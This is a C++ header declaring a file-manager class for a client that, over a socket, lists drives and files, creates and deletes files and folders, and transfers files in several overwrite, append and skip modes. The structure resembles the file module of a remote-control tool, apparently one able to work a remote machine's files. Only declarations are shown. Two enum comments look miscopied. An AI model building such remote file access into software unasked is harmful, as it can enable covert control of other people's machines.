#include "stdafx.h"
#include "Manager.h"
#include <list>
#include <string>
enum{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送

};
class CFileManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CFileManager(CClientSocket *pClient,UINT ID);
	virtual ~CFileManager();
	UINT	m_ID;
	wchar_t m_sendFileName[MAX_PATH];				 //file will send to server
	
private:
	bool DeleteDic(wchar_t* pDic);
public:
	list <wstring> m_UploadList;
	UINT m_nTransferMode;
	wchar_t m_strCurrentProcessFileName[MAX_PATH];	// 当前正在处理的文件
	__int64 m_nCurrentProcessFileLength;			// 当前正在处理的文件的长度
public:
	UINT SendDriveList();
	void SendFilesList(LPBYTE recvData);
	void OnCreateFolder(LPBYTE recvData);
	void OnDeleteFolder(LPBYTE recvData);
	void OnDeleteFile(LPBYTE recvData);
	void OnCreateFile(LPBYTE recvData);
	bool OnDownloadFile(LPBYTE recvData);
	bool FixedUploadList(LPCTSTR lpszDirectory);
	void StopTransfer();
	int  SendToken(int bToken);
	UINT SendFileSize(LPCTSTR lpszFileName);
	UINT SendFileData(LPBYTE lpBuffer);
	void UploadNext();
	bool UploadToRemote(LPBYTE lpBuffer);
};